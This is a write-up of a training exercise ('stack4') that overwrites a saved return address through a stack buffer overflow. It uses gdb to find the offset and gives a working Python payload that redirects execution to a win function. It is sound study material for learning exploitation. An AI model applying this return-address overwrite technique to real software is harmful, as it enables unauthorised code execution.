<h2>Goal</h2>

The objective here is again to call the win function, but by overwriting `$EIP` instead of a variable that is used to call a function.

```
objdump -d stack4 | grep win
080483f4 <win>:
```

This is where gdb is going to be required, the previous could be determined by someone experienced without using gdb.

Lets go inside gdb and start examining `gdb -q stack4`


To do this exercise (not just by guessing) will require to learn the `LEAVE` and `RET` instructions.  A very very brief refresher, but by no means a detailed explanation.  `LEAVE` is used to release the stack frame by copying `$EBP` into `$ESP`.  `RET` is then used to go to a return address on the stack, which then becomes `$EIP`. 

What does this mean?

It means we need to find what the value of `$EIP` is after the `RET` instruction, then go back and break at `RET` and find that value on the stack. That value will be the target address to overwrite.

To find out the values of `LEAVE` and `RET`
`(gdb)disas main`

The last few lines will have the instructions `LEAVE` and `RET`. Set a breakpoint for the `RET` line. Should look something like:
`(gdb)break *main+23`

We have created a breakpoint at the  `RET` instruction, now define a hook-stop so that on every break point the hook-stop prints out the values I requested. In this case I used:

```
(gdb)define hook-stop
>x/1i $eip
>x/8wx $esp
>end
```
This will print out the current `$EIP` value and top eight values of the stack.  The break will pause execution at the line `gets(buffer);`

Create exploit payload using python.

This payload is the size of the buffer, we do not want to overwrite the value of `$EIP` just yet.
`python -c 'print "A"*64 > /tmp/exp`

We can use the file as input for the executable in gdb.
`(gdb) run < /tmp/exp`

Once the breakpoint is hit you can view the value of `$EIP` and top eight `$ESP` printed out thanks to the hook stop.

In gdb send a `s` to tell it to single step, this will move to the next instruction and pause again.

Issues the command `i r`, this will show the value of the registers. Look for the `$EIP` value. For me it was: `0xb7eadc76`

Now, re-issues the run command.  Once the breakpoint is hit, do not continue.  `0xb7eadc76` should show in the top 8 values of the stack as printed by the hook-stop. If it is not you can use:
`x/80x $esp`, this will print 80 values of the stack.  You should be able to find the value now.

Here is what I got:

```							
0xbffffca0:	0x000000 0xbffffd00 0xb7eadc76
```
`ebp` = `0xbffffd00`
Saved `eip` that return loads = `0xb7eadc76`

The goal is to overwrite that value with the win function address.  To determine how much padding is between the end of our variable `buffer` found the number of bytes between the end of the `0x414141`'s and the byte before $EIP starts, b7 of the saved `$EIP`. We will need to add that many more garbage bytes, then our memory address `\xf4\x83\x04\x08`.  I had to add 12 more garbage bytes (A's) in then my address to get this to work.

<h2>Solution</h2>

`python -c 'print "A"*76+"\xf4\x83\x04\x08"' | ./stack4`

